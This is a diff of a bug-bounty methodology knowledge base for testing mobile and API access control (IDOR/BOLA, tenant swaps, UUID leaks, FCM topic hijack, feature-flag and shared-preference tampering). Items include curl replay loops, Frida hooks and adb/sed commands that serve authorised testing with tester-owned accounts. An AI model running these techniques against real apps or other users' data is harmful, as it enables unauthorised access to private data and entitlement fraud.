-   "maps_to": "field methodology (`bb-methodology` PART 4; `hunt-idor` anti-patterns)",
+   "maps_to": "OWASP WSTG-ATHZ-04; PortSwigger access-control research; the same gate as D01-079 (soft-404 / body-diff), applied here to every authz claim",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1326,11 +1391,15 @@
     "attack": [],
     "vrt": []
    },
-   "xrefs": [],
-   "domain_refs": [],
+   "xrefs": [
+    "D01-079"
+   ],
+   "domain_refs": [
+    "D01"
+   ],
    "has_code": true,
    "skip_when": "",
-   "test": "Two rules that together kill most false positives in this domain. **Marker discipline:** the second\naccount must carry a unique, unmistakable marker, and any reflection claim must be checked against the\n*baseline*. **Body-Diff Rule:** a bypass claim requires a response **body** differential, not a status code —\na 200 with a byte-identical body is not a bypass.",
+   "test": "**Gate owned by D01-079** (soft-404 and body-diff, P2); applied again here to every authz claim. Two rules that together kill most false positives in this domain. **Marker discipline:** the second\naccount must carry a unique, unmistakable marker, and any reflection claim must be checked against the\n*baseline*. **Body-Diff Rule:** a bypass claim requires a response **body** differential, not a status code —\na 200 with a byte-identical body is not a bypass.",
    "how": "```bash\n  # 1. write an 8+ char random marker into account B before any cross-account test\n  MARK=\"cp$(openssl rand -hex 5)\"          # never test/marker/evil/attacker/payload/AAAA/your own domain\n  curl -s -X PATCH https://api.example.com/v1/me -H \"Authorization: Bearer $TOKEN_B\" \\\n    -H 'Content-Type: application/json' -d '{\"displayName\":\"victim-'\"$MARK\"'\"}'\n  # 2. before claiming reflection, search the BASELINE (no-marker) response for the marker\n  curl -s \"$URL\" -H \"Authorization: Bearer $TOKEN_A\" | grep -c \"$MARK\"     # must be 0\n  # 3. body diff, not status\n  diff <(curl -s \"$URL_BASELINE\" -H \"Authorization: Bearer $TOKEN_A\" | jq -S .) \\\n       <(curl -s \"$URL_BYPASS\"   -H \"Authorization: Bearer $TOKEN_A\" | jq -S .)\n```",
    "proof": "The marker present in the attacker session's response and absent from the baseline; and, for a\nbypass, a byte-level diff in the report identifying *what* changed (correlation id? timestamp? real content?).",
    "escalation": "n/a — kill gates. The four anti-patterns they catch: 200-with-empty-body; self-scoped data\nreturned through an unsanitised parameter; a stale cache from a prior impersonation session; and fields that\nare already public on the user's own profile page.",
@@ -1355,7 +1424,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (`bb-methodology` PART 4)",
+   "maps_to": "methodology (this chapter's discipline gates); PortSwigger \"Smashing the state machine\"; NIST SP 800-63B §5.2.2 for the rate-limit claim",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1396,7 +1465,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (`bb-methodology` PART 4)",
+   "maps_to": "methodology (this chapter's discipline gates); API4:2023",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1437,7 +1506,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (`bb-methodology` PART 4 \"Shell-Loop Ban\")",
+   "maps_to": "methodology (this chapter's discipline gates — count every sweep); D27",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1450,7 +1519,9 @@
     "vrt": []
    },
    "xrefs": [],
-   "domain_refs": [],
+   "domain_refs": [
+    "D27"
+   ],
    "has_code": true,
    "skip_when": "",
    "test": "zsh array expansion fails **silently**. `for x in \"${arr[@]}\"` can produce zero iterations with no\nerror when the array was not populated by the previous command, and the output still looks complete. The\ncorpus's engagement lost ~50 verb-tampering probes to exactly this, with output that looked correct.",
@@ -1478,7 +1549,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "field methodology (`bb-methodology` Phase 5)",
+   "maps_to": "methodology (this chapter's discipline gates); D27 (multi-tool reproduction bar)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1491,7 +1562,9 @@
     "vrt": []
    },
    "xrefs": [],
-   "domain_refs": [],
+   "domain_refs": [
+    "D27"
+   ],
    "has_code": false,
    "skip_when": "",
    "test": "Before labelling anything Critical or High, reproduce it via **two independent tools with different\nHTTP stacks**. Cross-tool consistency rules out tool artefacts — the corpus's curl-only timing differential\nvanished under Python `requests` and was an artefact, not a bug.",
@@ -1542,6 +1615,7 @@
     ]
    },
    "xrefs": [
+    "D15-002",
     "D15-029",
     "D15-035",
     "D15-038",
@@ -1550,8 +1624,8 @@
    "domain_refs": [],
    "has_code": true,
    "skip_when": "",
-   "test": "For each route from `idor_candidates.txt`, replay account **A**'s authenticated request with\naccount **B**'s object id, where both accounts are tester-owned. This is the highest-yield test in a mobile\nengagement and the one that produces Critical ratings.",
-   "how": "```bash\n  # TOKEN_A / TOKEN_B from the proxy; ID_A / ID_B are objects you own; MARK written into B (D15-029)\n  while read -r m path; do\n    url_b=$(printf '%s' \"$path\" | sed \"s/{[a-zA-Z]*[Ii]d}/$ID_B/g\")\n    code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X \"$m\" \\\n            -H \"Authorization: Bearer $TOKEN_A\" \"https://api.example.com/$url_b\")\n    bytes=$(wc -c < /tmp/resp.json); hit=$(grep -c \"$MARK\" /tmp/resp.json)\n    printf '%s\\t%s\\t%s\\t%s\\tmarker=%s\\n' \"$m\" \"$url_b\" \"$code\" \"$bytes\" \"$hit\"\n    [ \"$code\" = 200 ] && [ \"$hit\" -gt 0 ] && cp /tmp/resp.json \"evidence/$(echo $url_b|tr / _).json\"\n  done < routes.tsv | tee bola_matrix.tsv\n```\nAlways include a **negative control**: the same request with a random/non-existent id, so you can show\n404 ≠ 403 ≠ 200 and prove the 200 is real data rather than a generic stub. Also test the id in every\nposition: path, query, JSON body, header (`X-User-Id`), and multipart field.",
+   "test": "For each route from `idor_candidates.tsv` (D15-002), replay account **A**'s authenticated request with\naccount **B**'s object id, where both accounts are tester-owned. This is the highest-yield test in a mobile\nengagement and the one that produces Critical ratings.",
+   "how": "```bash\n  # TOKEN_A / TOKEN_B from the proxy; ID_A / ID_B are objects you own; MARK written into B (D15-029)\n  while read -r m path; do\n    url_b=$(printf '%s' \"$path\" | sed \"s/{[a-zA-Z]*[Ii]d}/$ID_B/g\")\n    code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X \"$m\" \\\n            -H \"Authorization: Bearer $TOKEN_A\" \"https://api.example.com/$url_b\")\n    bytes=$(wc -c < /tmp/resp.json); hit=$(grep -c \"$MARK\" /tmp/resp.json)\n    printf '%s\\t%s\\t%s\\t%s\\tmarker=%s\\n' \"$m\" \"$url_b\" \"$code\" \"$bytes\" \"$hit\"\n    [ \"$code\" = 200 ] && [ \"$hit\" -gt 0 ] && cp /tmp/resp.json \"evidence/$(echo $url_b|tr / _).json\"\n  done < idor_candidates.tsv | tee bola_matrix.tsv; wc -l bola_matrix.tsv     # METHOD<TAB>PATH from D15-002; count the rows\n```\nAlways include a **negative control**: the same request with a random/non-existent id, so you can show\n404 ≠ 403 ≠ 200 and prove the 200 is real data rather than a generic stub. Also test the id in every\nposition: path, query, JSON body, header (`X-User-Id`), and multipart field.",
    "proof": "A saved response body containing account B's **marker**, retrieved with account A's token. Pair it\nwith the same request under B's own token returning the byte-identical body — that equality is what makes it\nundeniable. Show A's own request, B-via-A, and the non-existent-id control together.",
    "escalation": "→ D15-035 (write), D15-038 (scale), D15-060 (composition to ATO/money/privilege).",
    "ruled_out_when": "Every cross-account request returns a rejection whose **body** differs from the\nauthorised body, the non-existent-id control returns the same rejection shape as the cross-account one\n(proving the check is ownership-based, not existence-based), and the marker never appears. **Discipline:\nnever use a third party's real id**; if ids are non-guessable, create the second object yourself."
@@ -1756,7 +1830,7 @@
     "backend-api",
     "two-accounts"
    ],
-   "maps_to": "HackerOne Platform Standards, IDORs with Unpredictable IDs (effective 2 April 2024, updated 20 January 2026): \"Default: Set Attack Complexity to 'High' (AC:H)\"; \"Set Attack Complexity to 'Low' (AC:L) if the vulnerability report demonstrates a reliable, repeatable method for an attacker to obtain the specific IDs\"; RFC 4122",
+   "maps_to": "HackerOne Platform Standards, IDORs with Unpredictable IDs (effective 2 April 2024, updated 20 January 2026): \"Default: Set Attack Complexity to 'High' (AC:H)\"; \"Set Attack Complexity to 'Low' (AC:L) if the vulnerability report demonstrates a reliable, repeatable method for an attacker to obtain the specific IDs\"; RFC 9562 (obsoletes RFC 4122; defines v6/v7/v8 and the version nibble)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1776,9 +1850,9 @@
    ],
    "has_code": true,
    "skip_when": "",
-   "test": "\"UUID\" is not synonymous with \"random\". UUIDv1 encodes a 100 ns-resolution timestamp in the first\n60 bits plus a MAC-derived node id that is often stable across the app's hosts; v7 still leaks creation time.\nAnd a v4 UUID that *leaks elsewhere in the app* defeats the AC:H penalty entirely.",
+   "test": "\"UUID\" is not synonymous with \"random\". UUIDv1 encodes a 100 ns-resolution timestamp in the first\n60 bits plus a MAC-derived node id that is often stable across the app's hosts; **v6 is v1 with the timestamp\nbits reordered** (sortable, same leak); **v7** carries a 48-bit Unix-millisecond prefix and still leaks\ncreation time.\nAnd a v4 UUID that *leaks elsewhere in the app* defeats the AC:H penalty entirely.",
    "how": "```bash\n  # version = character 14 of the canonical form\n  echo \"$ID\" | cut -c15\n  # hunt the leak inside the application, not on Google\n  curl -s -H \"Authorization: Bearer $TOKEN_B\" https://api.target.tld/v1/feed \\\n    | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | sort -u\n```\nLeak sources that count: another API response, a share link, a push payload, a QR code, an exported provider\nrow (D07), a `Referer`, a public profile, a search endpoint, a \"recent items\" list that returns other\ntenants' ids.",
-   "proof": "A single reproducible chain, both requests in the report: request 1 (as attacker) yields the\nvictim's UUID; request 2 (as attacker) uses it to read or modify. For v1, collect ~20 UUIDs from legitimate\nflows, derive the per-instance counter, and brute adjacent values.",
+   "proof": "A single reproducible chain, both requests in the report: request 1 (as attacker) yields the\nvictim's UUID; request 2 (as attacker) uses it to read or modify. For v1/v6, collect ~20 UUIDs from legitimate\nflows, derive the per-instance counter, and brute adjacent values.",
    "escalation": "The same standard warns that third-party-only exposure (search engines, archives) may be\ntreated as accepted risk — find an **in-app** leak, not a Google dork. Note some programs (e.g. Spotify)\nexclude UUID-dependent access-control issues outright; check the policy before spending the day.",
    "ruled_out_when": "The id is v4, appears in no other response reachable by a different principal, is not\nemitted in push payloads, provider rows or share links, and is not present in any list/search response —\neach checked and listed. **Never accept \"but the ID is random\" as a defence from the vendor: randomness\nraises enumeration cost, not the existence of the bug.**"
   },
@@ -1797,8 +1871,10 @@
     "AM-01"
    ],
    "applies_to": "all, especially APIs behind a CDN/WAF that terminates and re-forwards",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API5:2023; PortSwigger access control — platform misconfiguration (`X-Original-URL`, `X-Rewrite-URL`); H1 \"Unauthorized access to admin/setpassword page by bypass 403 forbidden\"",
    "record": "",
    "legacy_meta": {},
@@ -1841,9 +1917,12 @@
     "AM-05"
    ],
    "applies_to": "any endpoint that accepts an id in a body or query",
-   "requires": "",
-   "requires_tags": [],
-   "maps_to": "API1:2023; field methodology (`hunt-idor` \"Array-wrap parameter\")",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "API1:2023; OWASP WSTG-ATHZ-04; PortSwigger access-control research (parameter pollution against an equality check)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1877,7 +1956,7 @@
    "severity": "critical",
    "severity_floor": "critical",
    "severity_note": "Critical",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it reaches another user's object",
+   "vrt": "`broken_access_control.privilege_escalation` (varies); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it reaches another user's object",
    "vrt_priority": "varies",
    "vrt_best": "P1",
    "attacker": "AM-05",
@@ -1885,9 +1964,12 @@
     "AM-05"
    ],
    "applies_to": "**mobile backends specifically** — the corpus names them as the canonical source of this bug",
-   "requires": "",
-   "requires_tags": [],
-   "maps_to": "API1:2023; API3:2023; `hunt-idor` root cause #3 (\"trusting client-supplied IDs in request bodies — mobile apps or SPAs send `org_id`\")",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "API1:2023; API3:2023; CWE-639 (client-supplied owner ids in request bodies — mobile apps and SPAs send `org_id`)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1895,7 +1977,9 @@
     "maswe": [],
     "masvs": [],
     "rules": [],
-    "cwe": [],
+    "cwe": [
+     "CWE-639"
+    ],
     "attack": [],
     "vrt": [
      "broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers",
@@ -1930,9 +2014,12 @@
     "AM-05"
    ],
    "applies_to": "multi-tenant backends",
-   "requires": "",
-   "requires_tags": [],
-   "maps_to": "API1:2023; `hunt-idor` \"Tenant-ID swap in multi-tenant SaaS\" (root cause #8)",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "API1:2023; OWASP WSTG-ATHZ-04 (tenant-id swap in multi-tenant SaaS); CWE-639",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -1940,7 +2027,9 @@
     "maswe": [],
     "masvs": [],
     "rules": [],
-    "cwe": [],
+    "cwe": [
+     "CWE-639"
+    ],
     "attack": [],
     "vrt": [
      "broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers"
@@ -1973,8 +2062,11 @@
     "AM-05"
    ],
    "applies_to": "all REST APIs with query DSLs; JSON:API and OData-style backends are the highest-yield",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023; API3:2023; PortSwigger GraphQL \"exploiting unsanitised arguments\" is the equivalent for GraphQL",
    "record": "",
    "legacy_meta": {},
@@ -2016,8 +2108,11 @@
     "AM-05"
    ],
    "applies_to": "offline-first, messaging, field-service and CRM apps",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023; API3:2023; API4:2023 (unbounded `limit`)",
    "record": "",
    "legacy_meta": {},
@@ -2104,8 +2199,11 @@
     "AM-01"
    ],
    "applies_to": "all apps that upload or display user documents",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023; sehno → Risky Functionality – File Uploads (\"uploaded files not directly accessible within the web root\"; \"not served on the same hostname/port\"; \"integrated with the authentication and authorisation schemas\")",
    "record": "",
    "legacy_meta": {},
@@ -2146,8 +2244,11 @@
     "AM-05"
    ],
    "applies_to": "all apps with a data-export / \"download my information\" feature",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023 (no external identifier verified in the corpus for this specific surface)",
    "record": "",
    "legacy_meta": {},
@@ -2190,8 +2291,11 @@
     "AM-05"
    ],
    "applies_to": "all apps with in-app support ticketing",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023 (no external identifier verified in the corpus for this specific surface)",
    "record": "",
    "legacy_meta": {},
@@ -2236,8 +2340,11 @@
     "AM-05"
    ],
    "applies_to": "all fintech, crypto, gig-economy, lending, gambling and marketplace apps",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023; API3:2023 (no external identifier verified in the corpus for this specific surface)",
    "record": "",
    "legacy_meta": {},
@@ -2280,9 +2387,12 @@
     "AM-05"
    ],
    "applies_to": "any bulk endpoint",
-   "requires": "",
-   "requires_tags": [],
-   "maps_to": "API1:2023; field methodology (`hunt-business-logic` \"bulk-action authorization gap\")",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "API1:2023; API5:2023; OWASP WSTG-BUSL-01 (bulk-action authorisation gap)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -2328,7 +2438,7 @@
     "backend-api",
     "two-accounts"
    ],
-   "maps_to": "API2:2023; `hunt-idor` Chain 5 (the removed-staff persistence class) and root cause #7",
+   "maps_to": "API2:2023; API5:2023; CWE-613 (the removed-principal persistence class)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -2336,7 +2446,9 @@
     "maswe": [],
     "masvs": [],
     "rules": [],
-    "cwe": [],
+    "cwe": [
+     "CWE-613"
+    ],
     "attack": [],
     "vrt": [
      "broken_authentication_and_session_management.failure_to_invalidate_session.on_logout"
@@ -2375,7 +2487,7 @@
     "backend-api",
     "two-accounts"
    ],
-   "maps_to": "API1:2023; `hunt-idor` \"IDOR via share or invite link reuse\"; `hunt-business-logic` \"invitation-token reuse\"; H1 #2032716 ($12,500, viewing any user's email via a crafted invitation)",
+   "maps_to": "API1:2023; CWE-640; H1 #2032716 ($12,500, viewing any user's email via a crafted invitation)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -2383,7 +2495,9 @@
     "maswe": [],
     "masvs": [],
     "rules": [],
-    "cwe": [],
+    "cwe": [
+     "CWE-640"
+    ],
     "attack": [],
     "vrt": [
      "broken_access_control.idor.modify_view_sensitive_information_guid"
@@ -2421,7 +2535,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "API8:2023; `hunt-idor` \"IDOR through caching layer\"; H1 #409370, #728664, #622122, #942629, #1183263, #1096609, #326639 (web-cache class)",
+   "maps_to": "API8:2023; PortSwigger web cache deception research; H1 #409370, #728664, #622122, #942629, #1183263, #1096609, #326639 (web-cache class)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -2536,12 +2650,13 @@
    },
    "xrefs": [],
    "domain_refs": [
-    "D13"
+    "D13",
+    "D18"
    ],
    "has_code": true,
    "skip_when": "",
    "test": "`subscribeToTopic()` is a **client-side** call with no server authorisation. If the app subscribes\nto `user_<id>`, `order_<id>` or `account_<hash>`, any user of the app can subscribe to any other user's topic\nand receive their messages, at scale.",
-   "how": "```bash\n  grep -rnE 'subscribeToTopic|/topics/|unsubscribeFromTopic' $S -B4 -A4\n```\n```javascript\nJava.perform(function () {\n  var M = Java.use('com.google.firebase.messaging.FirebaseMessaging');\n  M.getInstance().subscribeToTopic('user_' + '<ID_B>');\n  console.log('subscribed');\n});\n```\nOr call the IID/FCM REST subscribe with your own registration token and the other account's topic.",
+   "how": "```bash\n  grep -rnE 'subscribeToTopic|/topics/|unsubscribeFromTopic' $S -B4 -A4\n```\n```javascript\nJava.perform(function () {\n  var M = Java.use('com.google.firebase.messaging.FirebaseMessaging');\n  M.getInstance().subscribeToTopic('user_' + '<ID_B>');\n  console.log('subscribed');\n});\n```\nThe server-side topic API (`iid.googleapis.com/iid/v1:batchAdd`) needs the project's server credential —\nlegacy server keys were shut down in 2024–2025 and an OAuth bearer with the messaging scope is required — so\nit is only usable when D18 recovered one, and then it is a D18 finding. The attacker-feasible path is the\nin-app `subscribeToTopic` call above or a repackaged/instrumented client; a 401 from the REST API says\nnothing about topic authorisation.",
    "proof": "A message addressed to account B arriving on your device; capture the notification and the\n`FirebaseMessagingService.onMessageReceived` payload from logcat.",
    "escalation": "→ mass OTP/PII harvesting by subscribing to `user_1` … `user_N` → D13.",
    "ruled_out_when": "No topic subscription exists, or every topic name is a high-entropy server-issued value\nthat the client never derives locally — read the call site, do not infer it from the topic string you saw\nonce."
@@ -2562,8 +2677,11 @@
     "AM-05"
    ],
    "applies_to": "all",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023 (no external identifier verified in the corpus for this specific surface)",
    "record": "",
    "legacy_meta": {},
@@ -2709,7 +2827,7 @@
     "backend-api",
     "two-accounts"
    ],
-   "maps_to": "`hunt-idor` operator-level pattern and Chain 6; H1 #394329 ($8,000, cross-user parameter tampering in billing/subscription), #415081 ($10,500, adding privileged secondary users to another owner's business account)",
+   "maps_to": "API1:2023; API5:2023 (operator-level composition); H1 #394329 ($8,000, cross-user parameter tampering in billing/subscription), #415081 ($10,500, adding privileged secondary users to another owner's business account)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -2789,7 +2907,7 @@
    "severity": "critical",
    "severity_floor": "critical",
    "severity_note": "Critical",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES); `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (VARIES)",
+   "vrt": "`broken_access_control.privilege_escalation` (varies); `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (varies)",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-05",
@@ -2826,10 +2944,10 @@
    "has_code": true,
    "skip_when": "",
    "test": "Feature flags, remote config and `isPremium`/`isAdmin` booleans decide what the UI draws. They do\nnot decide what the API serves. Flip the flag to *discover* the request shape, then prove the server accepts\nit **without** instrumentation.",
-   "how": "```bash\n  grep -rnE 'isPremium|isAdmin|hasFeature|canEdit|entitlement|featureFlag|BuildConfig\\.ENABLE|RemoteConfig\\.getBoolean' $S -B4 -A6\n```\n```javascript\nJava.perform(function () {\n  var F = Java.use('com.target.FeatureFlags');\n  F.isEnabled.implementation = function (n) { console.log('[flag] ' + n + ' -> true'); return true; };\n});\n```\nCapture the request the unlocked UI produces, then replay it from Burp/curl on an un-instrumented client.",
+   "how": "```bash\n  grep -rnE 'isPremium|isAdmin|hasFeature|canEdit|entitlement|featureFlag|BuildConfig\\.ENABLE|RemoteConfig\\.getBoolean' $S -B4 -A6\n```\n```javascript\nJava.perform(function () {\n  var F = Java.use('com.target.FeatureFlags');\n  F.isEnabled.implementation = function (n) { console.log('[flag] ' + n + ' -> true'); return true; };\n});\n```\nBefore flipping anything, dump the flag table **per device** and keep both — the same build carries\ndifferent remote-flag state on the lab emulator and on a physical phone, so a negative on one device is not a\nnegative for the app:\n```bash\nadb -s \"$SERIAL\" shell run-as \"$PKG\" ls -R files shared_prefs | grep -iE 'flag|config|experiment'   # debuggable builds only\n# release builds: enumerate the flag provider's getBoolean/isEnabled calls with their returned values (the Frida hook above, logging instead of forcing)\n# record inventory/flags-<serial>.csv (flag, value, source) for every device in the lab\n```\nCapture the request the unlocked UI produces, then replay it from Burp/curl on an un-instrumented client.",
    "proof": "The privileged request succeeding against the unmodified server from an account that is not\nentitled (200 plus the privileged resource). **The Frida patch is only the discovery mechanism — the report\nmust show the server accepting the request without instrumentation.**",
    "escalation": "→ D23 entitlement fraud; → D15-061 when the flag reveals an admin route.",
-   "ruled_out_when": "The replayed request is rejected server-side on entitlement grounds with a distinct body,\nproving the flag is a UI hint over a server-enforced decision."
+   "ruled_out_when": "The replayed request is rejected server-side on entitlement grounds with a distinct body,\nproving the flag is a UI hint over a server-enforced decision.\n…on every device in the lab, with the per-device flag tables attached; a route reachable only in one cohort is\ntested in that cohort."
   },
   {
    "id": "D15-063",
@@ -2838,7 +2956,7 @@
    "severity": "critical",
    "severity_floor": "low",
    "severity_note": "High to Critical for the server-side effect; the UI-only change alone is Low",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES)",
+   "vrt": "`broken_access_control.privilege_escalation` (varies)",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-05",
@@ -2879,7 +2997,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Anything the app decides in-process — role, entitlement, price, limit, KYC state — is advisory.\nEnumerate every **server response field** the app branches on, flip it in the proxy, and then separately\nreplay the *request* that the unlocked UI produces to get the server's own answer. The UI change is not the\nfinding; the server accepting the consequent request is.",
-   "how": "```bash\n  grep -RnE '\"(role|isAdmin|isPremium|entitlement|tier|limit|balance|canWithdraw|kycStatus)\"' $S | head -40\n  # Burp: Proxy > Options > Match and Replace on the response body, e.g. \"isPremium\":false -> \"isPremium\":true\n  # then replay the resulting request WITHOUT the match-and-replace rule active\n```\nThe local-storage variant is the same question on disk:\n```bash\nadb shell run-as com.target.app sed -i 's/\"premium\">false/\"premium\">true/' \\\n  /data/data/com.target.app/shared_prefs/settings.xml\n```",
+   "how": "```bash\n  grep -RnE '\"(role|isAdmin|isPremium|entitlement|tier|limit|balance|canWithdraw|kycStatus)\"' $S | head -40\n  # Burp: Proxy > Options > Match and Replace on the response body, e.g. \"isPremium\":false -> \"isPremium\":true\n  # then replay the resulting request WITHOUT the match-and-replace rule active\n```\nThe local-storage variant is the same question on disk:\n```bash\n# debuggable build — the WHOLE device command is one double-quoted argument, so the device shell sees the sed quotes\nadb -s \"$SERIAL\" shell \"run-as $PKG sed -i.bak 's/\\\"premium\\\">false/\\\"premium\\\">true/' shared_prefs/settings.xml && run-as $PKG rm shared_prefs/settings.xml.bak\"\n# release build on the rooted harness (AM-12): pull, edit on the host, push back\nadb -s \"$SERIAL\" shell \"su -c 'cat /data/data/$PKG/shared_prefs/settings.xml'\" > settings.xml\nsed -e 's/\"premium\">false/\"premium\">true/' settings.xml > settings.new      # BSD/GNU-neutral: no -i\nadb -s \"$SERIAL\" push settings.new /data/local/tmp/s.xml\nadb -s \"$SERIAL\" shell \"su -c 'cp /data/local/tmp/s.xml /data/data/$PKG/shared_prefs/settings.xml && chown \\$(stat -c %U:%G /data/data/$PKG) /data/data/$PKG/shared_prefs/settings.xml'\"\nadb -s \"$SERIAL\" shell am force-stop \"$PKG\"\n```",
    "proof": "The unlocked action returning 200 with a real server-side effect — a new row, a transfer, a\ndownloaded premium asset — not just a changed screen.",
    "escalation": "→ D23 entitlement fraud; a flipped flag that gates a *security* control rather than a feature\nis Critical.",
    "ruled_out_when": "The server re-derives the decision and rejects the consequent request. State that\nexplicitly — \"the finding is client-side only\" — and move on; MASTG's framing for the storage variant is\nuseful for triage: private-sandbox data \"can still be tampered with in local attack scenarios, such as on\nrooted devices, during dynamic analysis, through backups, or by directly manipulating the app's data\ndirectory\" — name which path your PoC used."
@@ -2945,7 +3063,7 @@
    "severity": "critical",
    "severity_floor": "critical",
    "severity_note": "Critical",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES); `broken_authentication_and_session_management.authentication_bypass` (P1) where `emailVerified:true` skips the verification gate",
+   "vrt": "`broken_access_control.privilege_escalation` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) where `emailVerified:true` skips the verification gate",
    "vrt_priority": "varies",
    "vrt_best": "P1",
    "attacker": "AM-01 (registration is usually unauthenticated)",
@@ -3004,7 +3122,7 @@
     "backend-api",
     "two-accounts"
    ],
-   "maps_to": "API1:2023 + API3:2023 combined; `hunt-idor` Chain 4; H1 #981472 ($2,000, undocumented `fileCopy` mutation), #1066203 (cross-tenant `UpdateAtlasApplicationPerson`)",
+   "maps_to": "API1:2023 + API3:2023 combined; PortSwigger access-control and API-testing research; H1 #981472 ($2,000, undocumented `fileCopy` mutation), #1066203 (cross-tenant `UpdateAtlasApplicationPerson`)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -3083,7 +3201,7 @@
    "severity": "critical",
    "severity_floor": "high",
    "severity_note": "Critical (RCE on Node); High for a privilege flip",
-   "vrt": "`server_side_injection.remote_code_execution_rce` (P1) at the RCE end; `broken_access_control.privilege_escalation` (VARIES) for the flag flip",
+   "vrt": "`server_side_injection.remote_code_execution_rce` (P1) at the RCE end; `broken_access_control.privilege_escalation` (varies) for the flag flip",
    "vrt_priority": "P1",
    "vrt_best": "P1",
    "attacker": "AM-05",
@@ -3360,7 +3478,7 @@
    "severity": "critical",
    "severity_floor": "critical",
    "severity_note": "Critical",
-   "vrt": "`broken_access_control.privilege_escalation` (VARIES) — the impact is **mutation-surface unlock**, not information leakage",
+   "vrt": "`broken_access_control.privilege_escalation` (varies) — the impact is **mutation-surface unlock**, not information leakage",
    "vrt_priority": "varies",
    "vrt_best": "varies",
    "attacker": "AM-01 / AM-05",
@@ -3373,7 +3491,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "API5:2023; PortSwigger/field methodology `hunt-graphql` \"persisted-query fallback bypass\"",
+   "maps_to": "API5:2023; PortSwigger GraphQL research (persisted-query fallback bypass)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -3419,7 +3537,7 @@
    "requires_tags": [
     "backend-api"
    ],
-   "maps_to": "API5:2023; API8:2023; `hunt-graphql` \"operation-type confusion\" and \"mutation-via-GET\"",
+   "maps_to": "API5:2023; API8:2023; PortSwigger GraphQL research (operation-type confusion, mutation over GET)",
    "record": "",
    "legacy_meta": {},
    "ids": {
@@ -3488,7 +3606,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Whether the server recomputes the payable amount from server-side state (cart id, catalogue price)\nor trusts a client-supplied number. Test every money-adjacent key separately: if `amount` is recomputed but\n`discount` or `creditsToDeduct` is trusted, the same impact arrives through a different key. Then test the\nnumeric edge cases, which are a different bug: unbounded quantities produce refunds-on-purchase (negative\nline items), free items (zero-price × rounding) or integer overflow in the total.",
